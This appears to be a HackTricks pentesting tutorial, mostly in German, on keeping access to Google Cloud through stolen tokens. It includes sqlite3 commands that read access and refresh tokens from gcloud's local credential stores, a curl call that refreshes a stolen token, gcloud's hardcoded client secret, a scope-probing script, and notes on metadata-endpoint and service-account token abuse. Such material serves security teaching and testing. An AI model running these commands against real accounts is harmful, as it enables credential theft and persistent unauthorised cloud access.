# GCP - Token Persistenz

{{#include ../../../banners/hacktricks-training.md}}

### Authentifizierte Benutzer-Token

Um den **aktuellen Token** eines Benutzers zu erhalten, kannst du ausführen:

<details>

<summary>Access-Token aus SQLite-Datenbank abrufen</summary>
```bash
sqlite3 $HOME/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
</details>

Sieh auf dieser Seite nach, wie man dieses Token direkt mit gcloud verwendet:

{{#ref}}
https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#gcp
{{#endref}}

Um die Details zum **Generieren eines neuen access tokens** zu erhalten, führe aus:

<details>

<summary>Refresh token aus der SQLite-Datenbank holen</summary>
```bash
sqlite3 $HOME/.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
</details>

Es ist außerdem möglich, refresh tokens in **`$HOME/.config/gcloud/application_default_credentials.json`** und in **`$HOME/.config/gcloud/legacy_credentials/*/adc.json`** zu finden.

Um ein neues, aktualisiertes access token mit dem **refresh token**, der client ID und dem client secret zu erhalten, führe aus:

<details>

<summary>Neues access token mit refresh token abrufen</summary>
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
</details>

Die Gültigkeit von Refresh-Tokens kann unter **Admin** > **Security** > **Google Cloud session control** verwaltet werden; standardmäßig ist sie auf 16h gesetzt, kann aber auf "niemals ablaufen" eingestellt werden:

<figure><img src="../../../images/image (11).png" alt=""><figcaption></figcaption></figure>

### Authentifizierungsablauf

Der Authentifizierungsablauf bei Verwendung von beispielsweise `gcloud auth login` öffnet eine Eingabeaufforderung im Browser, und nachdem alle Scopes akzeptiert wurden, sendet der Browser eine Anfrage wie diese an den vom Tool geöffneten http-Port:
```
/?state=EN5AK1GxwrEKgKog9ANBm0qDwWByYO&code=4/0AeaYSHCllDzZCAt2IlNWjMHqr4XKOuNuhOL-TM541gv-F6WOUsbwXiUgMYvo4Fg0NGzV9A&scope=email%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20https://www.googleapis.com/auth/appengine.admin%20https://www.googleapis.com/auth/sqlservice.login%20https://www.googleapis.com/auth/compute%20https://www.googleapis.com/auth/accounts.reauth&authuser=0&prompt=consent HTTP/1.1
```
Then, gcloud will use the state and code with a some hardcoded `client_id` (`32555940559.apps.googleusercontent.com`) and **`client_secret`** (`ZmssLNjJy2998hD4CTg2ejr2`) to get the **final refresh token data**.

> [!CAUTION]
> Beachte, dass die Kommunikation mit localhost über HTTP erfolgt, daher ist es möglich, die Daten abzufangen, um einen refresh token zu erhalten. Diese Daten sind jedoch nur einmal gültig, weshalb das Abfangen nutzlos wäre — es ist einfacher, den refresh token direkt aus der Datei zu lesen.

### OAuth-Scopes

You can find all Google scopes in [https://developers.google.com/identity/protocols/oauth2/scopes](https://developers.google.com/identity/protocols/oauth2/scopes) or get them executing:

<details>

<summary>Alle Google OAuth-Scopes abrufen</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-A/\-\._]*' | sort -u
```
</details>

Es ist möglich zu sehen, welche Scopes die Anwendung, die **`gcloud`** zur Authentifizierung verwendet, mit diesem Skript unterstützen kann:

<details>

<summary>Unterstützte Scopes für gcloud testen</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope         \r"
if ! curl -v "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=32555940559.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%3A8085%2F&scope=openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fappengine.admin+$scope+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fsqlservice.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcompute+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Faccounts.reauth&state=AjvFqBW5XNIw3VADagy5pvUSPraLQu&access_type=offline&code_challenge=IOk5F08WLn5xYPGRAHP9CTGHbLFDUElsP551ni2leN4&code_challenge_method=S256" 2>&1 | grep -q "error"; then
echo ""
echo $scope
fi
done
```
</details>

Nach der Ausführung wurde geprüft, dass diese App folgende Scopes unterstützt:
```
https://www.googleapis.com/auth/appengine.admin
https://www.googleapis.com/auth/bigquery
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/compute
https://www.googleapis.com/auth/devstorage.full_control
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/userinfo.email
```
es ist interessant zu sehen, wie diese App den **`drive`**-Scope unterstützt, was einem Benutzer erlauben könnte, von GCP zu Workspace zu eskalieren, wenn ein Angreifer den Benutzer dazu bringt, ein Token mit diesem Scope zu erzeugen.

**Siehe, wie man das** [**hier missbraucht**](../gcp-to-workspace-pivoting/index.html#abusing-gcloud)**.**

### Service Accounts

Wie bei authentifizierten Benutzern gilt: Wenn es dir gelingt, die **private key file** eines service account zu kompromittieren, kannst du normalerweise **so lange darauf zugreifen, wie du willst**.\
Wenn du jedoch den **OAuth token** eines service account stiehlst, kann das noch interessanter sein, denn selbst wenn diese Tokens standardmäßig nur etwa eine Stunde gültig sind, bleibt der **OAuh token** gültig, bis er abläuft, falls das Opfer den privaten api key löscht.

### Metadata

Offensichtlich kannst du, solange du dich auf einer Maschine im GCP-Umfeld befindest, **auf den service account zugreifen, der an diese Maschine angehängt ist, indem du den metadata endpoint kontaktierst** (beachte, dass die Oauth tokens, auf die du über diesen Endpoint zugreifen kannst, normalerweise durch Scopes eingeschränkt sind).

### Remediations

Einige Gegenmaßnahmen für diese Techniken werden in [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2) erklärt.

### References

- [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
- [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

{{#include ../../../banners/hacktricks-training.md}}
